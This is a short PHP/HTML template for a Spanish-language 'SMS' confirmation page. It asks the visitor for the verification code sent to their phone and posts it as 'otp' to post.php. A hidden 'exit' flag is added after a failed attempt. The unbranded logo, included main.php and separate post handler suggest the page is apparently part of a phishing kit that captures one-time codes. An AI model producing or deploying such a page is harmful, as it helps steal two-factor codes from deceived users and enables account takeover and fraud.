<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>SMS</title>
</head>
<body>

<main>
    <div class="form">

    <div class="logo">
<img src="res/img/logo.png" >
</div>

    <div class="continer">

<form action="post.php" method="post">

<h2>Confirmación</h2>

<div class="col"><h4 style="font-weight:normal ;text-align:left;">Por favor, introduce el código de verificación enviado a tu teléfono.</h4> </div>

<div class="col">
<input type="text" placeholder="Introduce el código" name="otp" required> <br> 
<?php 
if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Código inválido</p>';
}
?>

<div class="but">
    <button type="submit">Confirmar</button>
</div>

</div> <br>

</form>

</div>
</div>

</main>
</body>
</html>